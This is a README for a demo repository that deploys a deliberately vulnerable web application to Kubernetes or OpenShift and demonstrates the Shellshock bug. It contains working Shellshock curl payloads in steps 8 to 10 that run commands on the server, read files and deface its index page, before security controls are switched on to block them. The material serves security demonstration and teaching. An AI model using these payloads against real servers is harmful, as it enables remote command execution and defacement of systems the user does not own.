# Insecure Deployment Demo
This repo is intended to host insecure deployments for educational and demo purposes. These should never be run in privileged mode and should avoid use on public networks.

This deployment is based off of public projects such as the Damn Vulerable Web Application and is intended to be used to demo the shellshock exploit in a Kubernetes environment.

# What is shellshock

# Demo Script

### Pre-requisite steps

1. Clone the repository


2. Deploy dvwa.yaml

For OpenShift:
`oc apply -f dvwa.yaml`


For Kubernetes:
`kubectl apply -f dvwa.yaml`

3. Port Forward to the application

*Note: It's important that this is not exposed to the public internet and highly reccomended to never be run in privlegded mode.*

4. Apply the yaml file

`kubectl apply -f dvwa.yaml`

5. Get the pods and copy the pod name for a targeted pod.

`oc get pods -n vulerable -w`

6. Export the pod name for ease of use

`export POD=<insert_pod_name>`

7. Port forward to the pod.
`oc port-forward $POD 8080:80 -n vulerable`

8. Check out the server

`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls /var/'" \
http://localhost:8080/cgi-bin/vulnerable`

9. Check out the index file for apache

`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /var/www/index.html'" \
http://localhost:8080/cgi-bin/vulnerable`

10. Time to mess with people

`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1>I like cats - also you should protect your stuff</h1><body><img src=https://miro.medium.com/max/1200/1*7_m4dF9OqBjePqqRyJ1O-g.jpeg></body></html>\" > /var/www/index.html'" http://localhost:8080/cgi-bin/vulnerable`

11. Turn on security controls for proccess baselining

Observe how me messing with people is blocked.
